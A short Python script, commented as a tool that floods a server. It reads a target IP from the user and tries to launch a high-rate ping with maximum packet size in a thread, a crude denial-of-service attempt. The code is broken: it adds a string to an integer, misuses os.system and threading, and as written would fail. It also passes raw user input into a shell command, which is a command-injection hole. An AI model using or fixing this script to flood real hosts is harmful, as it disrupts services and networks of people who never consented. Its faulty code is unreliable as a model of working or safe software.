#modules
import os 
import threading

#Defines 
MAX = 65507

#User input 
ip = input("Enter IP -----> ")

#Floods the server
threading.Thread(None, os.system('ping -i 0.2 -s ' + MAX, ip))
